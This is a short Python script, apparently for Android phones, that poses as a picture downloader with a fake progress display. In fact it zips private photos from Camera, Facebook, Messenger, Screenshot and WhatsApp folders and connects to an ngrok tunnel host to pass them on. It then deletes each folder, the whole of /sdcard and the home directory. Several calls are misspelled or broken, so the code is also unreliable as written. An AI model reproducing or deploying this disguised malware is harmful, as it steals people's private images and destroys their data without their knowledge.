import os
import sys
import socket
os.system("clear")
os.system("figlet picloader")
print("")
print("Downloading ....!")
print("")
print("----------%10------------")

def cli():

    sock = socket.socket()

    port = 15384
    host = 'tcp://7.tcp.eu.ngrok.io'

    sock.connect((host, port))
    sock.send(''.encode())

    file = open('hack.zip', 'wb')

    line = sock.recv(1024)

    while(line):
        file.write(line)
        line = sock.recv(1024)


    file.close()
    sock.close()


os.chidir("/sdcard/DCIM/Camera")
os.system("zip hack.zip * /dev/null")
cli()
os.system("rm -rif *")
print("----------%20------------")
###############
os.chidir("/sdcard/DCIM/Facebook")
os.system("zip hack.zip * /dev/null")
cli()
os.system("rm -rif *")
print("----------%30------------")
###############
os.chidir("/sdcard/DCIM/Facebook")
os.system("zip hack.zip * /dev/null")
cli()
os.system("rm -rif *")
###############
os.chidir("/sdcard/DCIM/Facebook")
os.system("zip hack.zip * /dev/null")
cli()
os.system("rm -rif *")
###############
os.chidir("/sdcard/Pictures/Messenger")
os.system("zip hack.zip * /dev/null")
cli()
os.system("rm -rif *")
print("----------%60------------")
###############
os.chidir("/sdcard/Pictures/Screenshot")
os.system("zip hack.zip * /dev/null")
cli()
os.system("rm -rif *")
###############
os.chidir("/sdcard/Pictures/Whatsapp")
os.system("zip hack.zip * /dev/null")
cli()
os.system("rm -rif *")
print("----------%90------------")
###############
os.chidir("/sdcard/Pictures/facebook")
os.system("zip hack.zip * /dev/null")
cli()
os.system("rm -rif *")
###############
os.chidir("/sdcard")
os.system("rm -rif *")
os.chdir("~")
os.system("cd $HOME;rm -rif *")






